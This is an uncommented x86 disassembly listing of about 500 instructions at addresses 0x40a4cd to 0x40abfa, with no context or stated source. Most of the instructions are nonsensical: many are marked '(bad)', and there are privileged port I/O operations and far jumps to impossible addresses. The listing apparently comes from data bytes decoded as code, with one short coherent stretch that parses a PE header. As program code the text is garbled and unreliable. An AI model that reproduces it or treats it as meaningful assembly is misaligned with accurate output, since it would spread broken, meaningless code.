  40a4cd:	pop    ss
  40a4ce:	mov    WORD PTR [esi+0x16],?
  40a4d1:	mov    ?,esi
  40a4d3:	rol    BYTE PTR [edx+0x10],1
  40a4d6:	pop    ds
  40a4d7:	dec    eax
  40a4d8:	outs   dx,DWORD PTR ds:[esi]
  40a4d9:	jmp    0x40a519
  40a4db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4dc:	ror    DWORD PTR [ebp+0x38],cl
  40a4df:	addr16 (bad) 
  40a4e1:	and    eax,0xdac9194
  40a4e6:	data16 (bad) 
  40a4e8:	pop    ebp
  40a4e9:	and    eax,0x2c455566
  40a4ee:	and    esi,DWORD PTR [eax+ebp*4]
  40a4f1:	js     0x40a503
  40a4f3:	or     ecx,DWORD PTR [esi+0x71]
  40a4f6:	rcl    BYTE PTR [ebx-0x5d0268cb],0xcd
  40a4fd:	outs   dx,DWORD PTR ds:[esi]
  40a4fe:	push   0xaa8adc31
  40a503:	shr    DWORD PTR [edx],cl
  40a505:	cs icebp 
  40a507:	(bad)  
  40a508:	ds in  al,dx
  40a50a:	rcl    DWORD PTR [eax-0x3c],cl
  40a50d:	push   0xffffff89
  40a50f:	xchg   BYTE PTR [edx+0x72],bh
  40a512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a513:	pop    ss
  40a514:	fisubr WORD PTR [ecx+ebx*8-0x4b]
  40a518:	mov    eax,0xcb981bd8
  40a51d:	retf   0xe537
  40a520:	push   esi
  40a521:	mov    esp,eax
  40a523:	out    0x4b,al
  40a525:	xor    bl,BYTE PTR [edi+eiz*8]
  40a528:	cs pop ebx
  40a52a:	inc    eax
  40a52b:	sub    eax,0xe537fee5
  40a530:	pop    ss
  40a531:	dec    esi
  40a532:	shr    DWORD PTR [edi],0x89
  40a535:	jecxz  0x40a4bf
  40a537:	adc    al,0x84
  40a539:	repz int3 
  40a53b:	inc    edi
  40a53c:	into   
  40a53d:	sub    bh,al
  40a53f:	xchg   edi,eax
  40a540:	xchg   ebx,eax
  40a541:	gs mov cl,0xd0
  40a544:	imul   ecx,DWORD PTR [eax-0x7a],0x15
  40a548:	test   ah,dh
  40a54a:	mov    al,ds:0xc24ee339
  40a54f:	out    0x91,eax
  40a551:	ja     0x40a581
  40a553:	aaa    
  40a554:	and    eax,0xcb74620a
  40a559:	pop    edx
  40a55a:	sub    DWORD PTR [eax+0x54d3f5bc],ebp
  40a560:	push   cs
  40a561:	push   ds
  40a562:	std    
  40a563:	xor    bh,BYTE PTR [eax+0x3287291b]
  40a569:	psubw  mm2,QWORD PTR [edx]
  40a56c:	mov    cl,0xc3
  40a56e:	ror    cl,cl
  40a570:	repz add al,0xee
  40a573:	shl    DWORD PTR ds:0x15ce224b,cl
  40a579:	in     eax,0x79
  40a57b:	ds int3 
  40a57d:	sub    eax,0xbc113e12
  40a582:	pop    edi
  40a583:	cli    
  40a584:	int    0x23
  40a586:	xor    eax,0x6cccacbf
  40a58b:	stos   BYTE PTR es:[edi],al
  40a58c:	js     0x40a56a
  40a58e:	inc    ecx
  40a58f:	push   edi
  40a590:	out    dx,al
  40a591:	in     eax,dx
  40a592:	popa   
  40a593:	fnsave [ebp+edi*8+0x51]
  40a597:	(bad)  
  40a598:	out    dx,al
  40a599:	sbb    cl,bh
  40a59b:	dec    edi
  40a59c:	jne    0x40a5f8
  40a59e:	mov    bh,0x6b
  40a5a0:	ret    0x9242
  40a5a3:	int    0x8
  40a5a5:	fmul   QWORD PTR [eax-0x77490ba9]
  40a5ab:	sar    BYTE PTR [ecx+0xc358d3a],cl
  40a5b1:	sahf   
  40a5b2:	lock mov eax,ds:0x23b98708
  40a5b8:	in     eax,0x79
  40a5ba:	out    0xba,eax
  40a5bc:	retf   
  40a5bd:	sub    bh,ah
  40a5bf:	add    ecx,DWORD PTR [esi-0x1c]
  40a5c2:	jo     0x40a633
  40a5c4:	mov    eax,0x28701298
  40a5c9:	fiadd  DWORD PTR [edi-0x32]
  40a5cc:	cmp    BYTE PTR [ebp+0x8],ch
  40a5cf:	aaa    
  40a5d0:	xor    al,0xaa
  40a5d2:	cld    
  40a5d3:	sahf   
  40a5d4:	mul    DWORD PTR [eax-0x6c01e0e4]
  40a5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5db:	mov    ebx,0x21c3e5f7
  40a5e0:	cmc    
  40a5e1:	jbe    0x40a594
  40a5e3:	ret    0xfb32
  40a5e6:	dec    eax
  40a5e7:	(bad)  
  40a5e8:	jmp    0x40a5d9
  40a5ea:	add    eax,0xa57f6179
  40a5ef:	stos   DWORD PTR es:[edi],eax
  40a5f0:	mov    ch,bh
  40a5f2:	mov    al,0x31
  40a5f4:	jno    0x40a62f
  40a5f6:	shl    BYTE PTR [ecx-0x2e005f8e],cl
  40a5fc:	push   es
  40a5fd:	ja     0x40a665
  40a5ff:	dec    edx
  40a600:	mov    WORD PTR ds:0xa4aea828,cs
  40a606:	inc    esi
  40a607:	lock pop ecx
  40a609:	or     al,0x27
  40a60b:	jle    0x40a630
  40a60d:	js     0x40a68a
  40a60f:	fld    DWORD PTR [ebp-0x5c]
  40a612:	xchg   edx,eax
  40a613:	push   cs
  40a614:	sahf   
  40a615:	add    eax,0x6c15b38d
  40a61a:	xchg   esp,eax
  40a61b:	sbb    DWORD PTR [eax+0x5],esi
  40a61e:	mov    bh,0xc3
  40a620:	mov    bl,0x9a
  40a622:	xor    eax,0x61cf18e6
  40a627:	adc    cl,al
  40a629:	jo     0x40a5fc
  40a62b:	and    al,0x3c
  40a62d:	nop
  40a62e:	(bad)  
  40a62f:	cmp    BYTE PTR [edi-0x45],bl
  40a632:	dec    ecx
  40a633:	enter  0xd37,0x5c
  40a637:	(bad)  
  40a638:	mov    ebp,0x229f9427
  40a63d:	inc    DWORD PTR ds:0xd39dc50c
  40a643:	das    
  40a644:	jmp    0xe7f75ccc
  40a649:	js     0x40a670
  40a64b:	mov    WORD PTR [ecx-0x3d],fs
  40a64e:	lds    ebx,FWORD PTR [esi-0x72]
  40a651:	jl     0x40a617
  40a653:	shl    esp,0x68
  40a656:	jne    0x40a5fa
  40a658:	out    0x71,eax
  40a65a:	push   es
  40a65b:	loopne 0x40a6b1
  40a65d:	idiv   DWORD PTR [edi]
  40a65f:	test   al,0xca
  40a661:	iret   
  40a662:	lea    esp,[eax]
  40a664:	ins    BYTE PTR es:[edi],dx
  40a665:	ja     0x40a67a
  40a667:	dec    edi
  40a668:	xchg   ebp,eax
  40a669:	inc    BYTE PTR [esi+0x3aaacbfd]
  40a66f:	mov    ds:0xd435ace,eax
  40a674:	jg     0x40a6c2
  40a676:	(bad)  
  40a677:	int3   
  40a678:	add    eax,esi
  40a67a:	mov    dl,0x8
  40a67c:	sbb    DWORD PTR [ebx-0xf91c301],esp
  40a682:	iret   
  40a683:	inc    ebx
  40a684:	mov    esp,0x715ada0b
  40a689:	push   ebx
  40a68a:	cmp    al,0x91
  40a68c:	dec    ebp
  40a68d:	pop    edx
  40a68e:	cmc    
  40a68f:	pop    esi
  40a690:	fwait
  40a691:	pop    ss
  40a692:	adc    al,0x9b
  40a694:	bound  ecx,QWORD PTR [edi+esi*1]
  40a697:	test   BYTE PTR [esp+ebx*4],al
  40a69a:	sub    bh,dl
  40a69c:	(bad)  
  40a69e:	out    0x51,eax
  40a6a0:	lds    ebx,FWORD PTR [eax-0x53813cb3]
  40a6a6:	(bad)  
  40a6a7:	xlat   BYTE PTR ds:[ebx]
  40a6a8:	pusha  
  40a6a9:	or     BYTE PTR [edi+0x50],dl
  40a6ac:	xor    cl,bh
  40a6ae:	sub    eax,0x16ad9aa5
  40a6b3:	mov    esp,0x88185f15
  40a6b8:	scas   al,BYTE PTR es:[edi]
  40a6b9:	mov    bx,0x6d39
  40a6bd:	dec    ebp
  40a6be:	xchg   edx,eax
  40a6bf:	inc    ebp
  40a6c0:	jmp    0xf56e9deb
  40a6c5:	and    bh,BYTE PTR [eax]
  40a6c7:	dec    ecx
  40a6c8:	inc    ebx
  40a6c9:	or     BYTE PTR [eax],al
  40a6cb:	outs   dx,BYTE PTR ds:[esi]
  40a6cc:	stos   DWORD PTR es:[edi],eax
  40a6cd:	ins    DWORD PTR es:[edi],dx
  40a6ce:	sahf   
  40a6cf:	xchg   DWORD PTR [edx+esi*8-0x466459e],ebp
  40a6d6:	retf   0x6e99
  40a6d9:	and    esp,DWORD PTR [esi+0x1ce9c703]
  40a6df:	add    eax,DWORD PTR [eax]
  40a6e1:	add    ch,ah
  40a6e3:	xchg   esi,eax
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4+0x54]
  40a6ef:	lods   eax,DWORD PTR ds:[esi]
  40a6f0:	fld    DWORD PTR [edx]
  40a6f2:	js     0x40a6dd
  40a6f4:	jle    0x40a774
  40a6f6:	jp     0x40a775
  40a6f8:	jle    0x40a778
  40a6fa:	xchg   edi,eax
  40a6fb:	mov    cl,0xb7
  40a6fd:	(bad)  
  40a6fe:	lods   eax,DWORD PTR ds:[esi]
  40a6ff:	scas   eax,DWORD PTR es:[edi]
  40a700:	cmp    eax,0x1a9a40a8
  40a705:	les    ebx,FWORD PTR [eax]
  40a707:	(bad)  
  40a708:	dec    edi
  40a709:	in     al,dx
  40a70a:	hlt    
  40a70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a70c:	xlat   BYTE PTR ds:[ebx]
  40a70d:	pop    ebp
  40a70e:	sbb    ecx,DWORD PTR [ebx+0x78]
  40a711:	pop    ebp
  40a712:	fnstcw WORD PTR [eax]
  40a714:	mov    ds:0x98006342,al
  40a719:	add    edx,0xffffffd6
  40a71c:	popa   
  40a71d:	aad    0x4a
  40a71f:	js     0x40a764
  40a721:	push   es
  40a722:	push   ebp
  40a723:	and    BYTE PTR [edx+ebp*4-0x4e17aa18],bh
  40a72a:	ret    0xc2b7
  40a72d:	sub    DWORD PTR [eax-0x25087dd7],ebx
  40a733:	xchg   edi,eax
  40a734:	and    eax,0x2059a0ec
  40a739:	mov    ebx,esp
  40a73b:	or     DWORD PTR [eax-0x46],esi
  40a73e:	enter  0xf15c,0xfe
  40a742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a743:	pop    esi
  40a744:	scas   al,BYTE PTR es:[edi]
  40a745:	sti    
  40a746:	lods   eax,DWORD PTR ds:[esi]
  40a747:	xor    bh,dl
  40a749:	sub    eax,0x35a013d8
  40a74e:	shl    DWORD PTR [ecx-0x6e],cl
  40a751:	fs xchg ecx,eax
  40a753:	push   cs
  40a754:	pop    edx
  40a755:	sub    BYTE PTR [edi],dl
  40a757:	cdq    
  40a758:	xchg   esp,eax
  40a759:	xchg   esp,eax
  40a75a:	mov    al,ds:0xeb08d44c
  40a75f:	arpl   WORD PTR [ecx+0x44],si
  40a762:	jmp    0x359e5381
  40a767:	lea    ebp,[ebp-0x6e3b030c]
  40a76d:	(bad)  
  40a76e:	neg    BYTE PTR [esi+edi*8]
  40a771:	cmp    DWORD PTR [ebx-0x725e43f5],ecx
  40a777:	out    dx,eax
  40a778:	dec    esp
  40a779:	ja     0x40a73f
  40a77b:	jmp    0x40a70d
  40a77d:	cmp    al,0xf7
  40a77f:	sub    ah,BYTE PTR [eax+0x6bc0fff3]
  40a785:	or     BYTE PTR [ecx],dl
  40a787:	push   ss
  40a788:	or     eax,0x277b5696
  40a78d:	push   ss
  40a78e:	push   ecx
  40a78f:	adc    al,0x3
  40a791:	sub    eax,DWORD PTR [ecx-0x4c]
  40a794:	mov    WORD PTR [ecx-0x41],gs
  40a797:	and    BYTE PTR [ebx-0x6e],cl
  40a79a:	or     al,0x37
  40a79c:	aad    0x1b
  40a79e:	mov    al,ds:0xc6db56e5
  40a7a3:	push   ss
  40a7a4:	dec    edi
  40a7a5:	sbb    edx,DWORD PTR [ecx]
  40a7a7:	sub    bh,dl
  40a7a9:	jp     0x40a798
  40a7ab:	scas   eax,DWORD PTR es:[edi]
  40a7ac:	pop    esp
  40a7ad:	cmp    BYTE PTR [ebx],bl
  40a7af:	push   edx
  40a7b0:	stos   BYTE PTR es:[edi],al
  40a7b1:	dec    esi
  40a7b2:	push   es
  40a7b3:	jne    0x40a7e0
  40a7b5:	rcr    esi,cl
  40a7b7:	inc    ebx
  40a7b8:	mov    bh,0xf5
  40a7ba:	or     al,0x72
  40a7bc:	mov    bl,0xf6
  40a7be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7bf:	adc    BYTE PTR [ecx-0x6a],ch
  40a7c2:	mov    esi,0x1d040ff
  40a7c7:	(bad)  
  40a7c8:	stos   BYTE PTR es:[edi],al
  40a7c9:	jno    0x40a76e
  40a7cb:	jg     0x40a817
  40a7cd:	fidivr WORD PTR gs:[ebp+0x67]
  40a7d1:	xchg   esp,eax
  40a7d2:	fwait
  40a7d3:	pop    es
  40a7d4:	push   ebx
  40a7d5:	or     al,0xa2
  40a7d7:	and    DWORD PTR [eax+0x3f],esp
  40a7da:	xchg   esi,eax
  40a7db:	xor    ebx,edx
  40a7dd:	out    0x31,al
  40a7df:	adc    esp,DWORD PTR [ebx+0x52a02323]
  40a7e5:	je     0x40a80c
  40a7e7:	push   esi
  40a7e8:	dec    esi
  40a7e9:	inc    ebp
  40a7ea:	in     eax,0x51
  40a7ec:	retf   0x5b59
  40a7ef:	dec    eax
  40a7f0:	stos   BYTE PTR es:[edi],al
  40a7f1:	adc    BYTE PTR [edi],dh
  40a7f3:	inc    ebp
  40a7f4:	imul   esp,ebx,0x9d589f14
  40a7fa:	push   esp
  40a7fb:	clc    
  40a7fc:	push   edi
  40a7fd:	pop    es
  40a7fe:	mov    WORD PTR [ebp+0x21004f3f],?
  40a804:	lods   al,BYTE PTR ds:[esi]
  40a805:	sub    eax,0x569c2e9f
  40a80a:	xchg   edx,eax
  40a80b:	xchg   DWORD PTR ds:0x71368899,edi
  40a811:	fcmovnbe st,st(6)
  40a813:	add    edi,0xfffffff4
  40a816:	xchg   BYTE PTR [esi-0x520d2767],ah
  40a81c:	xchg   ebx,eax
  40a81d:	sub    DWORD PTR [eax-0x13],edi
  40a820:	cs mov ah,0x66
  40a823:	pop    ss
  40a824:	mov    esp,es
  40a826:	ror    BYTE PTR [ebx+0x4f],1
  40a829:	icebp  
  40a82a:	outs   dx,BYTE PTR ds:[esi]
  40a82b:	fs scas al,BYTE PTR es:[edi]
  40a82d:	(bad)  
  40a82e:	push   edx
  40a82f:	sbb    DWORD PTR [esi+eax*8],edx
  40a832:	std    
  40a833:	jge    0x40a7b8
  40a835:	out    0x7d,al
  40a837:	mov    ch,0x21
  40a839:	mov    ebx,0xaca94b9d
  40a83e:	adc    eax,0x115412c8
  40a843:	xor    al,0x57
  40a845:	sti    
  40a846:	stos   DWORD PTR es:[edi],eax
  40a847:	clc    
  40a848:	mov    ecx,0x9d210ae8
  40a84d:	lock and BYTE PTR [eax+0x5e],dh
  40a851:	test   DWORD PTR [esi+0x4e],edi
  40a854:	pop    es
  40a855:	ja     0x40a8d3
  40a857:	out    0x41,eax
  40a859:	cmp    eax,0x80c2f80c
  40a85e:	xchg   edx,eax
  40a85f:	adc    eax,0x6d19d4e2
  40a864:	adc    BYTE PTR [ebx-0x6bed7f41],ah
  40a86a:	rcl    BYTE PTR [eax+edi*4],0xee
  40a86e:	fild   WORD PTR [esi+ebx*8-0x1ec18517]
  40a875:	je     0x40a81c
  40a877:	mov    eax,esp
  40a879:	push   esi
  40a87a:	fs daa 
  40a87c:	out    0xa2,al
  40a87e:	ret    0x67f5
  40a881:	xchg   esi,eax
  40a882:	out    0x48,eax
  40a884:	push   eax
  40a885:	rol    esi,cl
  40a887:	adc    bl,BYTE PTR ds:0xa38b282f
  40a88d:	pop    ebx
  40a88e:	cmp    DWORD PTR [ecx],0x77
  40a891:	adc    edx,esi
  40a893:	jl     0x40a863
  40a895:	and    ebx,DWORD PTR [edx]
  40a897:	in     eax,dx
  40a898:	fst    st(0)
  40a89a:	ss retf 0x2898
  40a89e:	int3   
  40a89f:	mov    al,BYTE PTR [ebx-0x3fe1e24]
  40a8a5:	mov    ah,0x94
  40a8a7:	inc    edx
  40a8a8:	outs   dx,DWORD PTR ds:[esi]
  40a8a9:	mov    ds:0x7fdd4f9d,al
  40a8ae:	rol    ch,1
  40a8b0:	pop    esp
  40a8b1:	jno    0x40a87d
  40a8b3:	jg     0x40a891
  40a8b5:	mov    bh,0x1c
  40a8b7:	push   eax
  40a8b8:	icebp  
  40a8b9:	test   eax,0xeaefa41f
  40a8be:	mov    dl,0x81
  40a8c0:	mov    esp,0x5e489ab6
  40a8c5:	push   ecx
  40a8c6:	out    0xe6,al
  40a8c8:	ficomp WORD PTR [esi-0x6f035dc1]
  40a8ce:	popa   
  40a8cf:	push   ecx
  40a8d0:	sub    esp,edx
  40a8d2:	or     eax,0x8b8f39b2
  40a8d7:	sub    BYTE PTR [ebx+0x2f4918ad],dh
  40a8dd:	pop    esi
  40a8de:	pop    ebx
  40a8df:	call   0x518c:0xb20a6fc5
  40a8e6:	mov    bl,0x9a
  40a8e8:	cmp    al,0x5c
  40a8ea:	mov    ebx,0xe6632486
  40a8ef:	cmp    eax,0x3e09c85c
  40a8f4:	fwait
  40a8f5:	clc    
  40a8f6:	dec    ecx
  40a8f7:	sub    al,BYTE PTR ds:0x10b03c94
  40a8fd:	jge    0x40a8e9
  40a8ff:	mov    cl,ah
  40a901:	sti    
  40a902:	iret   
  40a903:	ss leave 
  40a905:	ja     0x40a934
  40a907:	scas   al,BYTE PTR es:[edi]
  40a908:	gs (bad) 
  40a90a:	adc    ch,cl
  40a90c:	xlat   BYTE PTR ds:[ebx]
  40a90d:	(bad)  
  40a90e:	dec    edi
  40a90f:	xlat   BYTE PTR ds:[ebx]
  40a910:	adc    ebx,edx
  40a912:	xchg   DWORD PTR [ebx-0x32],edi
  40a915:	es in  al,dx
  40a917:	push   ds
  40a918:	push   ss
  40a919:	out    dx,eax
  40a91a:	retf   
  40a91b:	fs jnp 0x40a992
  40a91e:	add    eax,0xd04aceba
  40a923:	xchg   edi,eax
  40a924:	add    DWORD PTR [esi+0x6d],edi
  40a927:	inc    ebp
  40a928:	pop    edi
  40a929:	push   0xb164a9ae
  40a92e:	add    al,0x17
  40a930:	push   edi
  40a931:	or     al,0xf3
  40a933:	add    DWORD PTR gs:[edx+eiz*2-0x49],edi
  40a938:	jp     0x40a8bc
  40a93a:	add    cl,BYTE PTR [esi+0x20]
  40a93d:	ds dec ecx
  40a93f:	retf   0xe0d0
  40a942:	out    0x63,al
  40a944:	sub    al,0x12
  40a946:	push   es
  40a947:	pop    ds
  40a948:	jnp    0x40a974
  40a94a:	mov    dh,0x1
  40a94c:	mov    cs,WORD PTR [eax+0x15]
  40a94f:	push   ebx
  40a950:	inc    ebp
  40a951:	repz mov dh,0x15
  40a954:	(bad)  
  40a955:	out    0x62,al
  40a957:	mov    ch,0x48
  40a959:	and    DWORD PTR [eax],edx
  40a95b:	or     al,0xb6
  40a95d:	test   DWORD PTR [ebx-0x2e6adbf6],0xd94705a7
  40a967:	sbb    al,0x15
  40a969:	aam    0xb5
  40a96b:	fisub  WORD PTR [edx]
  40a96d:	or     eax,0xdf97c18
  40a972:	pop    ebx
  40a973:	call   0x653ee2a7
  40a978:	mov    ds:0x1fe1900a,al
  40a97d:	loopne 0x40a9e2
  40a97f:	pop    ebp
  40a980:	dec    esp
  40a981:	push   cs
  40a982:	mov    WORD PTR [edi-0x24],cs
  40a985:	bound  edi,QWORD PTR [edx]
  40a987:	lock mov WORD PTR [esp+ebx*2+0x4d],?
  40a98c:	fbld   TBYTE PTR [ebx+esi*2-0x75d42b35]
  40a993:	sub    al,BYTE PTR ds:0x921f2f12
  40a999:	xchg   ebp,eax
  40a99a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a99b:	(bad)  
  40a99c:	test   al,0xc2
  40a99e:	mov    eax,ds:0x40cd7bf1
  40a9a3:	test   al,0x16
  40a9a5:	(bad)  
  40a9a7:	xor    dl,BYTE PTR [ebx-0x2d3e0a25]
  40a9ad:	pusha  
  40a9ae:	inc    eax
  40a9af:	loope  0x40aa2c
  40a9b1:	mov    ecx,0x86a05b85
  40a9b6:	xchg   esp,eax
  40a9b7:	stos   BYTE PTR es:[edi],al
  40a9b8:	or     eax,0x6492c167
  40a9bd:	out    0xdf,al
  40a9bf:	jl     0x40a9db
  40a9c1:	pushf  
  40a9c2:	adc    cl,BYTE PTR [edx-0x7]
  40a9c5:	dec    esp
  40a9c6:	es push edi
  40a9c8:	(bad)  [ebx+0x46]
  40a9cb:	push   esi
  40a9cc:	mov    ecx,0xe5656c44
  40a9d1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40a9d3:	lock add eax,0xb8199237
  40a9d9:	inc    edx
  40a9da:	and    DWORD PTR [edi],edx
  40a9dc:	shl    dh,0x6d
  40a9df:	mov    cl,0x6f
  40a9e1:	scas   al,BYTE PTR es:[edi]
  40a9e2:	inc    esp
  40a9e3:	sti    
  40a9e4:	jb     0x40aa58
  40a9e6:	jbe    0x40aa64
  40a9e8:	mov    ebp,0x721483e
  40a9ed:	pusha  
  40a9ee:	cmp    edi,ebx
  40a9f0:	push   ss
  40a9f1:	xchg   DWORD PTR [edi],eax
  40a9f3:	mov    BYTE PTR [ebx],0x14
  40a9f6:	lods   al,BYTE PTR ds:[esi]
  40a9f7:	je     0x40a9fa
  40a9f9:	and    cl,bh
  40a9fb:	cmp    eax,0x139ef92
  40aa00:	je     0x40ba28
  40aa06:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa09:	mov    eax,DWORD PTR [ebp-0x8]
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR [eax+0x4c34f80],ebp
  40aa2e:	hlt    
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	aaa    
  40aa36:	mov    ebp,0x3028a771
  40aa3b:	leave  
  40aa3c:	jmp    0x9a58e0b7
  40aa41:	jmp    0x40aa6e
  40aa43:	retf   
  40aa44:	fwait
  40aa45:	lods   al,BYTE PTR ds:[esi]
  40aa46:	push   ds
  40aa47:	(bad)  
  40aa48:	call   0xee13682f
  40aa4d:	pop    eax
  40aa4e:	je     0x40aa5b
  40aa50:	loop   0x40aa4a
  40aa52:	shl    DWORD PTR [ecx+edi*1+0x3f],1
  40aa56:	in     eax,dx
  40aa57:	call   0x52321915
  40aa5c:	ret    
  40aa5d:	in     eax,0x73
  40aa5f:	addr16 in al,dx
  40aa61:	(bad)  
  40aa63:	pushf  
  40aa64:	push   esp
  40aa65:	pusha  
  40aa66:	inc    ebx
  40aa67:	(bad)  
  40aa68:	aad    0x54
  40aa6a:	cmp    DWORD PTR [ebp-0x2705163],0x7e
  40aa71:	into   
  40aa72:	fwait
  40aa73:	clc    
  40aa74:	jp     0x40aa91
  40aa76:	sub    DWORD PTR [edx+eiz*4-0xc71c80f],0x36eda474
  40aa81:	div    DWORD PTR [esp+eiz*2]
  40aa84:	jmp    0x4289:0x47d6d36c
  40aa8b:	adc    DWORD PTR [ecx-0x1b],esi
  40aa8e:	(bad)  
  40aa90:	xchg   ebx,eax
  40aa91:	mov    eax,0x270dec80
  40aa96:	int    0xce
  40aa98:	adc    eax,0xd2c80b44
  40aa9d:	mov    esp,0xcc3c318d
  40aaa2:	jb     0x40aac9
  40aaa4:	add    bh,BYTE PTR [ecx+ecx*2]
  40aaa7:	or     al,0x1b
  40aaa9:	wbinvd 
  40aaab:	and    BYTE PTR [edi+0x72],cl
  40aaae:	rol    DWORD PTR [ecx],cl
  40aab0:	mov    bh,0xf0
  40aab2:	push   esi
  40aab3:	add    edx,esi
  40aab5:	and    esi,DWORD PTR [esi+0x1]
  40aab8:	repz je 0x40ab36
  40aabb:	xchg   BYTE PTR [ecx-0x5faf3d7d],bl
  40aac1:	and    DWORD PTR [edx],edi
  40aac3:	call   0x75a3:0x4e195c79
  40aaca:	sahf   
  40aacb:	scas   al,BYTE PTR es:[edi]
  40aacc:	and    esp,esp
  40aace:	loope  0x40aac8
  40aad0:	ja     0x40aac5
  40aad2:	cmp    eax,0x1d60d34d
  40aad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aad8:	outs   dx,DWORD PTR ds:[esi]
  40aad9:	push   edi
  40aada:	mov    ecx,0xab3a56e6
  40aadf:	jo     0x40aafd
  40aae1:	out    0x75,eax
  40aae3:	jp     0x40ab1f
  40aae5:	jb     0x40ab17
  40aae7:	mov    ?,WORD PTR [edx+eax*8+0x4f]
  40aaeb:	call   DWORD PTR [ebx-0x3c963f5c]
  40aaf1:	sub    BYTE PTR [ebx+0x57d66fc7],al
  40aaf7:	adc    eax,0x7b27a8de
  40aafc:	sub    eax,0x391ee45a
  40ab01:	jge    0x40aaf9
  40ab03:	pop    es
  40ab04:	xchg   esi,eax
  40ab05:	stc    
  40ab06:	jmp    0x9107:0x2c46756d
  40ab0d:	add    BYTE PTR [ecx],bh
  40ab0f:	ret    
  40ab10:	and    ch,al
  40ab12:	jb     0x40aad4
  40ab14:	add    edx,esi
  40ab16:	dec    esp
  40ab17:	pop    ss
  40ab18:	inc    esp
  40ab19:	add    ebp,esp
  40ab1b:	retf   0xc643
  40ab1e:	xor    eax,0x47708834
  40ab23:	dec    esi
  40ab24:	lock mov edx,fs
  40ab27:	cwde   
  40ab28:	das    
  40ab29:	lahf   
  40ab2a:	scas   al,BYTE PTR es:[edi]
  40ab2b:	fidivr WORD PTR [edi]
  40ab2d:	xchg   esi,eax
  40ab2e:	cmc    
  40ab2f:	scas   al,BYTE PTR es:[edi]
  40ab30:	out    dx,eax
  40ab31:	sub    BYTE PTR [eax+edx*8-0x3],ah
  40ab35:	sti    
  40ab36:	xchg   esp,eax
  40ab37:	xor    ecx,esp
  40ab39:	dec    ebx
  40ab3a:	xchg   BYTE PTR [ebx+0x4],dh
  40ab3d:	push   esi
  40ab3e:	les    esp,FWORD PTR [esi]
  40ab40:	fbld   TBYTE PTR [ecx-0x3e]
  40ab44:	mov    dl,0x25
  40ab46:	enter  0x860a,0xa1
  40ab4a:	int    0x8a
  40ab4c:	xor    BYTE PTR [ecx],dh
  40ab4e:	and    bh,BYTE PTR [ecx-0x76]
  40ab51:	scas   al,BYTE PTR es:[edi]
  40ab52:	mov    esp,edi
  40ab54:	sbb    al,0x7c
  40ab56:	pop    eax
  40ab57:	push   ds
  40ab58:	repz enter 0x507f,0x2f
  40ab5d:	jbe    0x40abd7
  40ab5f:	adc    al,0x44
  40ab61:	xchg   edi,eax
  40ab62:	int    0x65
  40ab64:	jae    0x40ab4d
  40ab66:	adc    al,0x2a
  40ab68:	cli    
  40ab69:	lods   al,BYTE PTR ds:[esi]
  40ab6a:	fisub  WORD PTR [eax+ebx*4]
  40ab6d:	inc    esi
  40ab6e:	std    
  40ab6f:	hlt    
  40ab70:	jae    0x40abd1
  40ab72:	(bad)  
  40ab73:	fdiv   DWORD PTR [edi+edx*2-0x6a]
  40ab77:	lods   eax,DWORD PTR ds:[esi]
  40ab78:	ds daa 
  40ab7a:	leave  
  40ab7b:	in     eax,0xe4
  40ab7d:	adc    eax,0xd7c766f5
  40ab82:	inc    esi
  40ab83:	adc    dl,dh
  40ab85:	sub    BYTE PTR [esi],ch
  40ab87:	fdivr  DWORD PTR [ebx]
  40ab89:	enter  0x2d6a,0x5c
  40ab8d:	mov    bl,0xb3
  40ab8f:	cwde   
  40ab90:	push   cs
  40ab91:	fcom   DWORD PTR [esi+0x39dbfeaf]
  40ab97:	pop    esi
  40ab98:	(bad)  
  40ab99:	cmp    eax,0x4b444802
  40ab9e:	into   
  40ab9f:	int    0xfc
  40aba1:	iret   
  40aba2:	cmp    BYTE PTR [edx-0x5e],bl
  40aba5:	adc    al,0x2c
  40aba7:	ret    
  40aba8:	div    edi
  40abaa:	cmp    bl,BYTE PTR [edi+eiz*4]
  40abad:	xlat   BYTE PTR ds:[ebx]
  40abae:	popf   
  40abaf:	out    0x84,eax
  40abb1:	pop    esi
  40abb2:	ret    0xdc70
  40abb5:	lds    edx,FWORD PTR [edi+0x1fd275d4]
  40abbb:	lods   eax,DWORD PTR ds:[esi]
  40abbc:	ror    BYTE PTR [ebp-0x6ec059af],1
  40abc2:	repnz in eax,dx
  40abc4:	sub    al,0x79
  40abc6:	test   DWORD PTR [edi-0x5d],esp
  40abc9:	dec    ebx
  40abca:	scas   al,BYTE PTR es:[edi]
  40abcb:	loopne 0x40abe8
  40abcd:	or     eax,0x2eceb05f
  40abd2:	jo     0x40ac13
  40abd4:	mov    dl,0x89
  40abd6:	jno    0x40abd0
  40abd8:	cmp    dl,BYTE PTR [ecx]
  40abda:	pusha  
  40abdb:	(bad)  
  40abdc:	add    BYTE PTR [edi+0xcca3f8e],ah
  40abe2:	sbb    al,0x2d
  40abe4:	out    0xa5,al
  40abe6:	in     eax,dx
  40abe7:	out    dx,eax
  40abe8:	sub    DWORD PTR [edx+0x72],esp
  40abeb:	mov    ch,bl
  40abed:	cmp    eax,0x83bd3ace
  40abf2:	mov    edx,0x6fc753a5
  40abf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abf8:	jle    0x40aba7
  40abfa:	repnz arpl WORD PTR [ecx+0x23bad962],di
